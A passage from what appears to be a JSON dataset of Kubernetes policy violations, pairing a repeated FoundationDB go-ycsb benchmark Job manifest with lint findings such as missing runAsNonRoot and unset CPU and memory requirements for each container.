    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fdb-workloadf\" is not set to runAsNonRoot"
  },
  {
    "id": "00981",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fdb-workloada\" has cpu request 0"
  },
  {
    "id": "00982",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fdb-workloadb\" has cpu request 0"
  },
  {
    "id": "00983",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fdb-workloadc\" has cpu request 0"
  },
  {
    "id": "00984",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fdb-workloadd\" has cpu request 0"
  },
  {
    "id": "00985",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fdb-workloade\" has cpu request 0"
  },
  {
    "id": "00986",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fdb-workloadf\" has cpu request 0"
  },
  {
    "id": "00987",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fdb-workloada\" has memory limit 0"
  },
  {
    "id": "00988",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fdb-workloadb\" has memory limit 0"
  },
  {
    "id": "00989",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fdb-workloadc\" has memory limit 0"
  },
  {
    "id": "00990",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      volumes:\n      - name: config-volume\n        configMap:\n          name: sample-cluster-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fdb-workloadd\" has memory limit 0"
  },
  {
    "id": "00991",
    "manifest_path": "data/manifests/the_stack_sample/sample_0239.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdb-bench\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdb-workloada\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloada\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadb\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadb\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadc\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadc\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadd\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadd\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloade\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloade\n        - -p\n        - fdb.cluster=/mnt/config-volume/cluster-file\n        - -p\n        - fdb.apiversion=620\n        volumeMounts:\n        - name: config-volume\n          mountPath: /mnt/config-volume\n      - name: fdb-workloadf\n        image: pierrezemb/go-ycsb:fdb-6.2.11\n        command:\n        - /go-ycsb\n        - run\n        - basic\n        - -P\n        - workloads/workloadf\n        - -p\n        - 